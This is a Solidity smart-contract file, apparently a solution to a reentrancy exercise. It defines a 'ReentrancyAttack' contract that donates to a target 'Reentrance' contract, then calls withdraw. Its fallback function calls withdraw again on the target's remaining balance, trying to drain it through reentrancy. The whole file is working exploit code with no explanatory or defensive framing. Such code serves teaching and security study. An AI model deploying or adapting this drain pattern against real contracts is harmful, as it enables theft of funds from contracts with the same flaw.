// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./Reentrancy.sol";
import "hardhat/console.sol";

contract ReentrancyAttack {
    Reentrance reentrance;
    uint public amount = 100000000000000;

    constructor (address payable _reentranceAddy) public {
        reentrance = Reentrance(_reentranceAddy);
        console.log("Reentrance contract initiated");
    }

    function sendMoney() public {
        reentrance.donate{value: amount, gas: 4000000}(address(this));
        console.log("Sending money");
    }

    function getMoney() public {
        console.log("Get money is being called...");
        reentrance.withdraw(amount);
    }

    function getContractsBalance() public view returns (uint) {
        uint balance = reentrance.balanceOf(address(this));
        return balance;
    }

    fallback() external payable {
        if (address(reentrance).balance != 0) {
            uint remaining = address(reentrance).balance;
            reentrance.withdraw(remaining);
        }   
    }
}